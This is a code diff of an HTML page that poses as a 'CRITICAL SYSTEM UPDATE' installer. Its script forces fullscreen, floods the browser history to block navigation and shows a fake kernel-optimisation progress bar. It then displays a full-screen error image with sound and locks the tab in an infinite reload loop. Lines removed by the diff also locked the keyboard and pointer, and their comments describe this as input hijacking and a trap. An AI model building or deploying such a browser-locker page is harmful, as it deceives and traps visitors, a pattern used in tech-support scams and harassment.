@@ -10,76 +10,70 @@
         #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
         #bar-outer { width: 80%; height: 40px; border: 2px solid #00e5ff; margin-top: 20px; }
         #bar-inner { width: 0%; height: 100%; background: #00e5ff; box-shadow: 0 0 20px #00e5ff; }
+        /* Style for the error image */
+        #error-image { display: none; width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 2000; }
     </style>
 </head>
 <body>
+    <div id="start-screen">
+        <h1>CRITICAL SYSTEM UPDATE</h1>
+        <button class="btn-sync" onclick="engage()">INSTALL</button>
+    </div>
 
-<div id="start-screen">
-    <h1>CRITICAL SYSTEM UPDATE</h1>
-    <button class="btn-sync" onclick="engage()">INSTALL</button>
-</div>
+    <div id="loading-overlay">
+        <h1 id="status-msg">OPTIMIZING KERNEL...</h1>
+        <div id="bar-outer"><div id="bar-inner"></div></div>
+    </div>
 
-<div id="loading-overlay">
-    <h1 id="status-msg">OPTIMIZING KERNEL...</h1>
-    <div id="bar-outer"><div id="bar-inner"></div></div>
-</div>
+    <!-- Error Image Element -->
+    <img id="error-image" src="error2.png" alt="System Error">
 
-<script>
-async function engage() {
-    // 1. Silent Fullscreen & Input Hijack
-    const doc = document.documentElement;
-    if (doc.requestFullscreen) await doc.requestFullscreen();
-    if (navigator.keyboard && navigator.keyboard.lock) {
-        await navigator.keyboard.lock(["Escape", "F11", "KeyW", "ControlLeft", "AltLeft"]);
-    }
-    if (doc.requestPointerLock) doc.requestPointerLock();
+    <script>
+        async function engage() {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) await doc.requestFullscreen();
+            
+            document.getElementById('start-screen').style.display = 'none';
+            const overlay = document.getElementById('loading-overlay');
+            overlay.style.display = 'flex';
 
-    document.getElementById('start-screen').style.display = 'none';
-    const overlay = document.getElementById('loading-overlay');
-    overlay.style.display = 'flex';
+            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 1);
 
-    // 2. History Loop (Prevents Back/Forward/Reload Popups)
-    setInterval(() => {
-        window.history.pushState(null, "", window.location.href);
-    }, 1);
-
-    // 3. Loading Animation
-    let p = 0;
-    const bar = document.getElementById('bar-inner');
-    const loadInt = setInterval(() => {
-        p += 0.2;
-        bar.style.width = p + "%";
-        if (p >= 100) {
-            clearInterval(loadInt);
-            freezeSystem();
-        }
-    }, 10);
-}
-
-function freezeSystem() {
-    // 4. The "No-Popup" Trap: Memory Spike & Thread Lock
-    // Instead of location.reload() which triggers a popup, we use a recursive loop
-    // that crashes the tab renderer so the user can't interact with anything.
-    console.log("System Locked.");
-    
-    // Disable any interaction
-    window.onbeforeunload = null; 
-    
-    // Set the localStorage flag when the user tries to leave/reload
-            window.onbeforeunload = function () {
-                localStorage.x = 1;
-            };
-    
-            // Wait 5 seconds (5000ms), then start the reload loop
-            setTimeout(function () {
-                console.log("Starting reload loop...");
-                
-                // This creates an infinite loop of reload commands
-                while (true) {
-                    location.reload();
+            let p = 0;
+            const bar = document.getElementById('bar-inner');
+            const loadInt = setInterval(() => {
+                p += 0.5; // Faster for testing
+                bar.style.width = p + "%";
+                if (p >= 100) {
+                    clearInterval(loadInt);
+                    triggerErrorMedia(); // New trigger function
                 }
+            }, 10);
+        }
+
+        function triggerErrorMedia() {
+            // 1. Hide the loading overlay
+            document.getElementById('loading-overlay').style.display = 'none';
+
+            // 2. Show the error image
+            const errImg = document.getElementById('error-image');
+            errImg.style.display = 'block';
+
+            // 3. Play the error audio
+            const audio = new Audio('error.mp3');
+            audio.play().catch(e => console.log("Audio play blocked:", e));
+
+            // 4. Continue to system freeze
+            setTimeout(freezeSystem, 1000); 
+        }
+
+        function freezeSystem() {
+            console.log("System Locked.");
+            window.onbeforeunload = function () { localStorage.x = 1; };
+            setTimeout(function () {
+                while (true) { location.reload(); }
             }, 5000);
-}
-</script>
+        }
+    </script>
 </body>
 </html>
